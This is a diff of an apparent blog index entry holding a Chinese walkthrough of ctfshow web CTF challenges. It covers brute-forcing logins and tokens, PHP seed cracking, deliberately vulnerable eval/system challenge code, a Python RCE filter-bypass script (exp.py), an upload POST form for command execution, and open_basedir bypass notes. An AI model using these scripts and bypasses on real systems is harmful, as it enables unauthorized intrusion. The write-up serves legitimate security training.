@@ -183,8 +183,8 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/</url>
+    <title>ctfshow题解</title>
+    <url>/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote>
 <p>题目： 开发注释未及时删除<br>解题思路： ctrl+u查看源码即可得到flag</p>
 </blockquote>
@@ -230,7 +230,7 @@
 <p>题目： 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>解题思路： 根据提示访问&#x2F;editor,一个个尝试，最终打开图片——图片空间——var——www——html——nothinghere——fl000g.txt，根据这些提示访问&#x2F;nothinghere&#x2F;fl000g.txt,即可得到flag。</p>
 </blockquote>
 <h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote>
-<p>题目： 公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br>解题思路： 翻到网页最下面可以看到<a href="mailto:&#x31;&#x31;&#53;&#x36;&#x36;&#51;&#49;&#x39;&#54;&#49;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x31;&#x31;&#53;&#x36;&#x36;&#51;&#49;&#x39;&#54;&#49;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#109;</a>，访问&#x2F;admin,点击忘记密码，需要回答：我的所在地是哪个城市？，想到刚刚所得的邮箱，查看一下发现是西安的账号，输入西安，密码重置，输入用户名和密码即可得到flag。</p>
+<p>题目： 公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br>解题思路： 翻到网页最下面可以看到<a href="mailto:&#x31;&#49;&#x35;&#x36;&#54;&#51;&#x31;&#x39;&#54;&#x31;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x31;&#49;&#x35;&#x36;&#54;&#51;&#x31;&#x39;&#54;&#x31;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a>，访问&#x2F;admin,点击忘记密码，需要回答：我的所在地是哪个城市？，想到刚刚所得的邮箱，查看一下发现是西安的账号，输入西安，密码重置，输入用户名和密码即可得到flag。</p>
 </blockquote>
 <h2 id="web16（探针，tz-php）"><a href="#web16（探针，tz-php）" class="headerlink" title="web16（探针，tz.php）"></a>web16（探针，tz.php）</h2><blockquote>
 <p>题目： 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露<br>解题思路： 根据提示“探针”，访问&#x2F;tz.php，查看PHP参数，点击PHPINFO，在页面中搜索flag,即可得到flag。</p>
@@ -250,40 +250,40 @@
 <h2 id="web-20（mdb文件）"><a href="#web-20（mdb文件）" class="headerlink" title="web 20（mdb文件）"></a>web 20（mdb文件）</h2><blockquote>
 <p>题目： mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。<br>解题思路： 访问<code>/db/db.mdb</code>，下载文件用记事本打开，查找flag。</p>
 </blockquote>
-<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/ba4b2a2fed244a4ca3f092653ac1b92e.png" class="" title="在这里插入图片描述">
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/ba4b2a2fed244a4ca3f092653ac1b92e.png" class="" title="在这里插入图片描述">
 
 <p>首先进行弱口令尝试，没有登录成功</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/49c0de22b8bd4a999d830dee99cbf51a.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/49c0de22b8bd4a999d830dee99cbf51a.png" class="" title="在这里插入图片描述">
 
 <p>抓包进行爆破，发现Authorization字段是base64加密</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/7b6dfdb5941249e49970975a48a32bf1.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/7b6dfdb5941249e49970975a48a32bf1.png" class="" title="在这里插入图片描述">
 
 <p>进行base64解码发现是账号:密码的格式</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/afe1b00c952f444c80ee1567b01614f7.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/afe1b00c952f444c80ee1567b01614f7.png" class="" title="在这里插入图片描述">
 
 <p>进行对此处进行爆破</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/e32bc24a560d4d9ebf5cf733c57095d7.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/e32bc24a560d4d9ebf5cf733c57095d7.png" class="" title="在这里插入图片描述">
 
 <p>设置payload，在payload type中选择此模块</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/6596572d396d428c83d4f45ca628b6f3.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/6596572d396d428c83d4f45ca628b6f3.png" class="" title="在这里插入图片描述">
 
 <p>设置payload中第一部分</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/6702b71fde9c44dda41af8deae8a7c6e.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/6702b71fde9c44dda41af8deae8a7c6e.png" class="" title="在这里插入图片描述">
 
 <p>第二部分</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/5931e4f952cc48bd94add5c7532f9df8.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/5931e4f952cc48bd94add5c7532f9df8.png" class="" title="在这里插入图片描述">
 
 <p>第三部分，将题目中的压缩包进行解压，把txt进行导入</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/277422dd0fd44608b44699c94a800946.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/277422dd0fd44608b44699c94a800946.png" class="" title="在这里插入图片描述">
 
 <p>接下来将payload进行加密处理</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2cc550614c234350bbaa74aba4821091.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2cc550614c234350bbaa74aba4821091.png" class="" title="在这里插入图片描述">
 
 <p>将此处取消勾选不对这些符号进行url编码</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/f2a004bf13d945baa292ef63db414204.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/f2a004bf13d945baa292ef63db414204.png" class="" title="在这里插入图片描述">
 
 <p>开始爆破，看到有一个payload爆破成功</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/84d609211dad4f7c8911edd871a1b8f6.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/84d609211dad4f7c8911edd871a1b8f6.png" class="" title="在这里插入图片描述">
 
 <h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>目前域名失效，直接输题目给的flag{ctf_show_web}</p>
 <h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>根据代码提示</p>
@@ -294,64 +294,64 @@
 <li>token的第二位加上第十五位加上第十八位除第二位等于第三十二位</li>
 </ol>
 <p>注意：编程里是从0开始计算的</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/0593cdaec56c4c739153fd9f8ff7cbae.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/0593cdaec56c4c739153fd9f8ff7cbae.png" class="" title="在这里插入图片描述">
 
 <p>随意题意写一个脚本</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        url=<span class="string">&quot;http://5df04327-7549-4d99-8205-94d6271bf994.challenge.ctf.show/?token=&quot;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)</span><br><span class="line">        req=requests.get(url=url).text	</span><br><span class="line">        <span class="comment"># requests.get(url=url).text使用requests库中的get方法来获取指定url的内容，并返回该内容的文本形式。</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(req)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>一段php代码，需要传入参数r，在做判断</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/29f54c08851847539d134bf3cf36f23f.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/29f54c08851847539d134bf3cf36f23f.png" class="" title="在这里插入图片描述">
 
 <p>看这个随机数等于多少</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/b41415a6f82945acae3243d7de28d3c7.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/b41415a6f82945acae3243d7de28d3c7.png" class="" title="在这里插入图片描述">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/a2270e6c40ee45e69a6cc3ea6498b607.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/a2270e6c40ee45e69a6cc3ea6498b607.png" class="" title="在这里插入图片描述">
 
 <h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">题目要求我们向服务器传输一个参数’r‘,程序将flag用md5加密后，取前8位作为种子，用mt_srand()函数生成一个随机数，然后将两者相减，将结果赋值给$rand,如果$rand等于0，那么检查cookie中的token是否等于两个mt_srand() 的和，如果是，则输出flag。如果$ rand不等于0，则输出$rand。因为mt_srand()的种子是用flag生成的，我们无法直接预测mt_srand()的输出。通过查阅资料得知，可使用php_mt_seed工具进行种子爆破。</span><br><span class="line"></span><br><span class="line">先令r=0，得到第一个mt_srand()的值</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/51e55dfdb72d4d429c003a2e9f338b17.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/51e55dfdb72d4d429c003a2e9f338b17.png" class="" title="在这里插入图片描述">
 
 <p>在kali中使用php_mt_seed工具，首先输入make后就可正常使用</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/bd0814aa98ac4ced999ec632269824ae.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/bd0814aa98ac4ced999ec632269824ae.png" class="" title="在这里插入图片描述">
 
 <p>再通过抓包工具找到php版本</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/80b6b52577aa4b488e4eb084779b5fe0.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/80b6b52577aa4b488e4eb084779b5fe0.png" class="" title="在这里插入图片描述">
 
 <p>用这个种子写一个php测试脚本</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/df41e295768b4befacf4a7efc258b1d7.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/df41e295768b4befacf4a7efc258b1d7.png" class="" title="在这里插入图片描述">
 
 <p>得到另一个值后在bp中改包添加Cookie值</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/b37f7180f3af408caccb4edb1acc152f.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/b37f7180f3af408caccb4edb1acc152f.png" class="" title="在这里插入图片描述">
 
 <h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>输入后，进行抓包</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/d7982f60125b455b9af185a78903c237.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/d7982f60125b455b9af185a78903c237.png" class="" title="在这里插入图片描述">
 
 <p>对密码进行爆破</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/ac430059d92e4a38ba4da1f763771085.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/ac430059d92e4a38ba4da1f763771085.png" class="" title="在这里插入图片描述">
 
 <h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>下载录取名单</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/50af3af24c214e7aa1f69fd12e769fcd.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/50af3af24c214e7aa1f69fd12e769fcd.png" class="" title="在这里插入图片描述">
 
 <p>发现只是缺少年月日</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/c48c2acfdd724b02b9191d1dd37efc3c.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/c48c2acfdd724b02b9191d1dd37efc3c.png" class="" title="在这里插入图片描述">
 
 <p>进行爆破年月日</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/cd3e5595d9c04498bbb8910900e5c8cb.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/cd3e5595d9c04498bbb8910900e5c8cb.png" class="" title="在这里插入图片描述">
 
 <p>19900201爆破成功</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/46164255d7b846879055745b16950544.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/46164255d7b846879055745b16950544.png" class="" title="在这里插入图片描述">
 
 <p>成功登录</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/70468879ca8c480590506ea92ea91260.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/70468879ca8c480590506ea92ea91260.png" class="" title="在这里插入图片描述">
 
 <h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>对目录进行爆破</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2fc1e994f5d04e0a8819e7a233278d34.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2fc1e994f5d04e0a8819e7a233278d34.png" class="" title="在这里插入图片描述">
 
 <p>去掉2.txt，对目录进行爆破</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/0ed4725d0fcb435090676d024a8fae44.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/0ed4725d0fcb435090676d024a8fae44.png" class="" title="在这里插入图片描述">
 
 <p>得到flag</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/b15e5fd9503249a4af4dfebc6b8acf39.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/b15e5fd9503249a4af4dfebc6b8acf39.png" class="" title="在这里插入图片描述">
 
 <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
@@ -430,9 +430,9 @@
 <p>exp.py</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240417223733029.png" class="" title="image-20240417223733029">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240417223733029.png" class="" title="image-20240417223733029">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240417223751144.png" class="" title="image-20240417223751144">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240417223751144.png" class="" title="image-20240417223751144">
 
 <h2 id="web42（-dev-null-2-1绕过）"><a href="#web42（-dev-null-2-1绕过）" class="headerlink" title="web42（&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1绕过）"></a>web42（&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1绕过）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -597,13 +597,13 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>上传一个1.txt，用bp抓包</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240420160230662.png" class="" title="image-20240420160230662">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240420160230662.png" class="" title="image-20240420160230662">
 
 <p>构造poc执行命令，然后在上传文件内容添加sh命令</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240420160900703.png" class="" title="image-20240420160900703">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240420160900703.png" class="" title="image-20240420160900703">
 
 <p>直接读取flag.php</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240420160938119.png" class="" title="image-20240420160938119">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240420160938119.png" class="" title="image-20240420160938119">
 
 <h2 id="web57（上题基础过滤-和-）"><a href="#web57（上题基础过滤-和-）" class="headerlink" title="web57（上题基础过滤.和?）"></a>web57（上题基础过滤.和?）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -663,16 +663,16 @@
 
 <h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="INI-SET"><a href="#INI-SET" class="headerlink" title="INI_SET"></a>INI_SET</h2><ol>
 <li><p>函数主体<code>ini_set</code>引起我的注意，可以看到在最后函数使用<code>ini_set</code>来设置<code>open_basedir</code>。这之前的代码并没有特别的操作只是在跳目录，那么这些代码是否能够省略，从而直接通过<code>ini_set</code>设置<code>open_basedir</code>呢？我进行了尝试发现不可以。问题后面会提。我又想到既然<code>ini_set</code>可以设置<code>php.ini</code>内的设置项，那么可不可以直接通过脚本来设置<code>disable_functions</code>为空从而绕过<code>disable_functions</code>的限制呢？我又进行了尝试发现还是不可以，不过在我意料之中。我只能查看官方文档，发现了一些东西：</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/8e7b335dd54131a65f1a20905828d931.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/8e7b335dd54131a65f1a20905828d931.png" class="" title="img">
 
 <p>果然，不是所有的配置选项都可以通过<code>ini_set</code>在脚本中设置。在<a href="https://www.php.net/manual/zh/ini.list.php">附录</a>中指定了各个配置能够以怎样的方式进行修改。</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/b2d386d4d6fd8416108293fbb4ccd615.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/b2d386d4d6fd8416108293fbb4ccd615.png" class="" title="img">
 
 <p><code>disable_functions</code>和<code>open_basedir</code>可修改的范围分别为<code>php.ini only</code>和<code>PHP_INI_ALL</code>。<code>disable_functions</code>可被修改的范围只能是<code>php.ini</code>（之前的不能通过<code>ini_set</code>绕过<code>disable_functions</code>的困惑解决）。<code>PHP_INI_ALL</code>代表的含义如下</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/eb0267b06d758bb303e2d5ade4d2329a.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/eb0267b06d758bb303e2d5ade4d2329a.png" class="" title="img">
 
 <p>如图，可在任意位置被修改。那么我之前为啥不能修改呢？</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/f3afe0a1b1a7c036142478b915675e76.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/f3afe0a1b1a7c036142478b915675e76.png" class="" title="img">
 
 <p>从官方说明可以看到在脚本内定义的<code>open_basedir</code>只能收紧在<code>php.ini</code>的配置。而不能拓宽配置。因此我们想要直接设置<code>open_basedir</code>为<code>/</code>也就无从谈起。</p>
 </li>
@@ -683,7 +683,7 @@
 <p>从官方说明可以看到在脚本内定义的<code>open_basedir</code>只能收紧在<code>php.ini</code>的配置。而不能拓宽配置。</p>
 </blockquote>
 <p>也可以理解为只能限制在本文件夹下，而我们<code>ls -a</code>可以看到<code>..</code>也存在于本文件夹下。</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/ed36eceaa191b4db879e6d460510b125.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/ed36eceaa191b4db879e6d460510b125.png" class="" title="img">
 
 <p>就可以通过<code>ini_set</code>设置<code>open_basedir</code>为<code>..</code>。也因此我们可以通过<code>chdir</code>进入这个目录（上一级目录）如此循环直至<code>/</code>。其实不必获取路径再计算要跳目录的次数，直接跳就完了，和文件包含有点像，跳足够多就一定回到根目录。此时我们想要读取某一文件。php得到<code>open_basedir</code>为<code>..</code>(跳目录次数足够多即为根目录)，可直接读取到。</p>
 </li>
@@ -691,18 +691,18 @@
